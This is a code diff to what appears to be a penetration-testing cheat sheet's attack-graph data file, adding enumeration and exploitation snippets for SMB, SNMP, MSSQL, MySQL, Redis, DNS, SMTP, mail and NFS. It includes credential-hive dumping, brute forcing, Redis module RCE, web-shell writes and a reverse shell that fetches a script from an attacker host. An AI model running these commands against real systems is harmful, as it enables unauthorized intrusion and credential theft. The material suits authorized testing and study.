@@ -26,6 +26,12 @@ netexec smb <target> -u guest -p '' --shares`,
                     label: 'Full enum',
                     code: 'enum4linux-ng -A <target>',
                 },
+                {
+                    label: 'NetBIOS + net view',
+                    code: `nbtscan -r <subnet>/24
+net view \\\\<dc> /all
+nmblookup -A <target>`,
+                },
             ],
             tags: ['smb', 'netexec', 'crackmapexec', 'enum4linux', 'shares'],
         },
@@ -57,6 +63,13 @@ smb: \\> mget *`,
                 {
                     label: 'Auth as guest + spider',
                     code: "netexec smb <target> -u guest -p '' --shares --spider <share> --pattern txt,ps1,xml,ini,conf",
+                },
+                {
+                    label: 'Backup share -> SAM/SYSTEM hives',
+                    code: `# a Backups share often holds registry hives / .bak files:
+smbclient //<target>/Backups -N -c 'prompt OFF; recurse ON; mget *'
+# if SAM + SYSTEM (or .bak hives) are inside:
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL`,
                 },
             ],
             tags: ['smb', 'null-session', 'guest', 'shares', 'loot'],
@@ -200,6 +213,14 @@ snmpwalk -c public -v2c <target> 1.3.6.1.2.1.25.4.2.1.2   # processes`,
 snmpwalk -c public -v1 <target> 1.3.6.1.4.1.77.1.2.25    # Windows users
 snmpwalk -c public -v1 <target> 1.3.6.1.2.1.25.4.2.1.2   # running processes`,
                 },
+                {
+                    label: 'nsExtendObjects + hydra brute',
+                    code: `# custom OIDs (NET-SNMP-EXTEND-MIB) often leak command output / creds:
+snmpwalk -c public -v2c <target> 1.3.6.1.4.1.8072.1.3.2
+snmpwalk -c public -v2c <target> NET-SNMP-EXTEND-MIB::nsExtendObjects
+# brute community strings with hydra:
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target> snmp`,
+                },
             ],
             tags: ['snmp', '161', 'udp', 'snmpwalk', 'community'],
         },
@@ -230,6 +251,12 @@ EXEC xp_cmdshell 'whoami';`,
                     label: 'Reverse shell via xp_cmdshell',
                     code: `EXEC xp_cmdshell 'powershell -nop -c "iex (iwr -UseBasicParsing http://<kali-ip>/rev.ps1)"';`,
                 },
+                {
+                    label: 'sqlcmd (native client)',
+                    code: `sqlcmd -S localhost\\SQLEXPRESS -U <user> -P <pass> -C -Q "SELECT name FROM sys.databases"
+sqlcmd -S localhost\\SQLEXPRESS -U <user> -P <pass> -C -Q "SELECT * FROM <db>.dbo.<table>"
+# -C trusts the server cert; -E uses Windows auth`,
+                },
             ],
             tags: ['mssql', '1433', 'xp_cmdshell', 'impacket'],
         },
@@ -258,6 +285,14 @@ netexec mysql <target> -u root -p ''`,
                     code: `SHOW GRANTS;
 SELECT LOAD_FILE('/etc/passwd');
 SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/sh.php';`,
+                },
+                {
+                    label: 'Dump all DBs for creds (mysqldump)',
+                    code: `# on a Windows host with the mysql client:
+mysqldump.exe -u root --all-databases > db.sql
+findstr /i /s "password passwd" db.sql
+# on Linux:
+mysqldump -u root --all-databases | grep -iE 'password|passwd'`,
                 },
             ],
             tags: ['mysql', '3306', 'outfile', 'file-priv'],
@@ -305,6 +340,13 @@ searchsploit -x <id>          # read it first`,
 ls /usr/share/nmap/scripts | grep -i <product>
 # after copy: fix LHOST/LPORT/offsets, run in a throwaway VM`,
                 },
+                {
+                    label: 'Cross-compile Windows exploits',
+                    code: `# compile a Windows exploit on Kali:
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
+i686-w64-mingw32-gcc exploit.c -o exploit32.exe -lws2_32
+# then transfer + run on the target`,
+                },
             ],
             references: [
                 { label: 'Exploit-DB', url: 'https://www.exploit-db.com/' },
@@ -342,8 +384,118 @@ redis-cli -h <target> CONFIG SET dbfilename sh.php
 redis-cli -h <target> SET x '<?php system($_GET["c"]); ?>'
 redis-cli -h <target> SAVE`,
                 },
+                {
+                    label: 'Module RCE (redis-rogue-server)',
+                    code: `# Redis 4.x/5.x with no auth -> load a malicious .so module for RCE:
+git clone https://github.com/n0b0dyCN/redis-rogue-server
+cd redis-rogue-server/RedisModulesSDK && make
+python3 redis-rogue-server.py -rhost <target> -lhost <kali-ip> -passwd ''
+# in the spawned shell: MODULE LOAD /tmp/exp.so ; system.exec 'id'
+# cleanup on the box: MODULE UNLOAD system`,
+                    note: 'Falls back to master/slave replication RCE on Redis 4.x when module load is blocked.',
+                },
             ],
             tags: ['redis', '6379', 'ssh-key', 'cron', 'unauthenticated'],
+        },
+        {
+            id: 'dns-enum',
+            title: 'Enumerate DNS',
+            type: 'technique',
+            phase: 'service-enum',
+            os: 'agnostic',
+            description:
+                'Port 53 (or any resolver you can query) leaks hostnames, subdomains and mail servers. Zone transfers and reverse lookups map the whole target network.',
+            commands: [
+                {
+                    label: 'Zone transfer + common records',
+                    code: `dig axfr @<target> <domain>
+dig any <domain> @<target>
+dig -x <target> @<target>
+host -t ns <domain>; host -t mx <domain>`,
+                },
+                {
+                    label: 'Subdomain brute',
+                    code: `dnsrecon -d <domain> -t std,brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+dnsenum <domain>`,
+                },
+            ],
+            tags: ['dns', '53', 'zone-transfer', 'dig', 'subdomain'],
+        },
+        {
+            id: 'smtp-enum',
+            title: 'Enumerate SMTP',
+            type: 'technique',
+            phase: 'service-enum',
+            os: 'agnostic',
+            description:
+                'Port 25/465/587. VRFY, EXPN and RCPT TO enumerate valid users, and the banner leaks the mail server name and version.',
+            commands: [
+                {
+                    label: 'Banner + user enumeration',
+                    code: `nc -nv <target> 25
+VRFY root
+VRFY admin
+EXPN root`,
+                },
+                {
+                    label: 'Automated enum (smtp-user-enum)',
+                    code: `smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <target>
+smtp-user-enum -M RCPT -U users.txt -t <target>`,
+                },
+            ],
+            tags: ['smtp', '25', 'vrfy', 'user-enum'],
+        },
+        {
+            id: 'imap-pop3-enum',
+            title: 'Enumerate IMAP / POP3',
+            type: 'technique',
+            phase: 'service-enum',
+            os: 'agnostic',
+            description:
+                'Port 110/143/993/995. With creds, log in and read mailboxes - password-reset links, credentials and internal info sit in inboxes.',
+            commands: [
+                {
+                    label: 'POP3 login + read',
+                    code: `nc -nv <target> 110
+USER <user>
+PASS <pass>
+LIST
+RETR 1`,
+                },
+                {
+                    label: 'IMAP login + list',
+                    code: `nc -nv <target> 143
+a1 LOGIN <user> <pass>
+a2 LIST "" "*"
+a3 SELECT INBOX
+a4 FETCH 1 BODY[]`,
+                },
+            ],
+            tags: ['imap', 'pop3', '110', '143', 'mail'],
+        },
+        {
+            id: 'nfs-enum',
+            title: 'Enumerate NFS',
+            type: 'technique',
+            phase: 'service-enum',
+            os: 'linux',
+            description:
+                'Port 2049 (with rpcbind on 111). showmount lists exports; a mountable share often holds configs, backups or web roots.',
+            commands: [
+                {
+                    label: 'List + mount exports',
+                    code: `showmount -e <target>
+mkdir /mnt/nfs
+sudo mount -t nfs <target>:/<export> /mnt/nfs
+ls -la /mnt/nfs`,
+                },
+                {
+                    label: 'nmap NFS scripts',
+                    code: `nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <target>
+rpcinfo -p <target>`,
+                },
+            ],
+            tags: ['nfs', '2049', 'showmount', 'mount'],
         },
     ],
     edges: [
@@ -410,6 +562,12 @@ redis-cli -h <target> SAVE`,
             to: 'foothold-windows',
             label: 'writable startup / scheduled script',
         },
+        { from: 'dns-enum', to: 'user-list', label: 'hostnames / users harvested' },
+        { from: 'dns-enum', to: 'web-dirbust', label: 'subdomains / vhosts found' },
+        { from: 'smtp-enum', to: 'user-list', label: 'VRFY / RCPT users' },
+        { from: 'imap-pop3-enum', to: 'creds-found', label: 'creds in a mailbox' },
+        { from: 'nfs-enum', to: 'nfs-no-root-squash', label: 'no_root_squash export' },
+        { from: 'nfs-enum', to: 'creds-found', label: 'config / backup on the share' },
     ],
 }
 
